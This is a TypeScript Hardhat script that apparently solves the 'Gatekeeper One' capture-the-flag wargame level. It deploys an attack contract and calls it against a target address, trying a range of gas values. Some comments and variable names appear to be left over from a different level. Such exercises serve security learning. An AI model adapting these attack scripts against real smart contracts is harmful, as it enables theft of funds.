import { ethers } from "hardhat";

async function attackGateKeeperOne() {
    // change contract addresses here. change gas only if needed.
    const _gateAddress = "0x5a2C7Bb67C57AD2b89731D97d0a1bc1D6Cc7c1A0";
    const _gasLowerLimit = 50;
    const _gasUpperLimit = 300;
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability comes from the possibility of making a malicious contract the king
    // Additional read:
    // site here

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackGateKeeperOne", args);
    // alternative below
    console.log("Deploying attack contract AttackGateKeeperOne...");
    const Factory = await ethers.getContractFactory("AttackGateKeeperOne", deployer);
    const attackGateKeeperOne = await Factory.deploy();
    console.log(attackGateKeeperOne);
    console.log(`Contract deployed to ${attackGateKeeperOne.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (attackGateKeeperOne.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // don't touch below
    const attack = await ethers.getContractAt("AttackGateKeeperOne", attackGateKeeperOne.address);
    const tx = await attack.enterGate(_gateAddress, _gasLowerLimit, _gasUpperLimit);
    const txReceipt = await tx.wait(1);
    const event1 = await txReceipt.events[0].args.succeeded.toString();
    const event2 = await txReceipt.events[0].args.gasUsed.toString();
    console.log(`You passed this(Gatekeeper One) level: ${event1}`);
    console.log(`Gas used: ${event2}`);
}

attackGateKeeperOne()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
